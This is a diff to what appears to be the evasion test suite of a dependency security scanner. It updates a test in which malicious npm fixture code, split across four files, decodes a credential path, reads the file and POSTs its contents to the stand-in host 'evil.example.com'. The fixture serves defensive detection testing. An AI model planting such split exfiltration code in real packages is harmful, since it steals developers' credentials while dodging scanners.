@@ -48,8 +48,8 @@ pub fn run_all() -> Vec<VectorResult> {
             id: "E06",
             name: "hn-multi-file-scatter",
             layer: Layer::StaticScan,
-            technique: "Logic split across 3 files",
-            expected: Expected::Miss,
+            technique: "Logic split across 4 files",
+            expected: Expected::Detect, // Package-level capability aggregation catches cross-file exfil
             test_fn: test_multi_file_scatter,
         },
         EvasionTest {
@@ -300,7 +300,8 @@ WebAssembly.instantiate(wasmBuffer).then(m => m.instance.exports.exploit());
 }
 
 fn test_multi_file_scatter() -> bool {
-    // E06: Malicious logic split across 3 files — no single file triggers
+    // E06: Malicious logic split across 4 files — no single file triggers
+    // Complete exfiltration chain: decode → build path → read file → send network
     let dir = ScanPackageBuilder::npm("hn-multi-file-scatter")
         .file(
             "decoder.js",
@@ -323,17 +324,29 @@ module.exports.getTarget = function() {
         .file(
             "reader.js",
             r#"
-// Combines the two — reads credentials using decoded path
-const decoder = require('./decoder');
+// Reads credentials using decoded path
 const paths = require('./path');
 const fs = require('fs');
 const target = paths.getTarget();
 const content = fs.readFileSync(target);
+module.exports.read = function() { return content; };
+"#,
+        )
+        .file(
+            "sender.js",
+            r#"
+// Sends data to external server
+const https = require('https');
+const reader = require('./reader');
+const data = reader.read();
+https.request({hostname: 'evil.example.com', method: 'POST'}).end(data);
 "#,
         )
         .build();
-    let output = run_scan(dir.path(), "patterns");
-    output.contains("DEPSEC-P004")
+    // Run both patterns AND capabilities checks — the capability aggregation
+    // detects the cross-file exfiltration pattern (fs_read + credential path + network)
+    let output = run_scan(dir.path(), "patterns,capabilities");
+    output.contains("DEPSEC-CAP") || output.contains("DEPSEC-COMBO")
 }
 
 fn test_mainmodule_require() -> bool {
